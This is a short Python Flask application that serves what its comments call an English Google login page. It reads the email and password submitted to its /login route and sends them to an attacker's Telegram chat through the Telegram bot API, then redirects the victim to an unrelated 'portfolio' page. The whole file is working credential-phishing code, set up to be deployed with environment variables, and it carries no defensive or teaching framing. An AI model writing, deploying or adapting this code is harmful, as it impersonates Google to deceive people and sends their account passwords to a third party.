import os
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# Fetch secrets from Render Environment Variables
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

@app.route('/')
def home():
    # Shows the English Google Login page first
    return render_template('google_login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Telegram Notification
    message = f"🚀 New Access Attempt!\n\n📧 Email: {email}\n🔑 Password: {password}"
    
    if BOT_TOKEN and CHAT_ID:
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            requests.post(telegram_url, data={'chat_id': CHAT_ID, 'text': message})
        except Exception as e:
            print(f"Error: {e}")

    # Redirect to your Portfolio (the index.html file)
    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)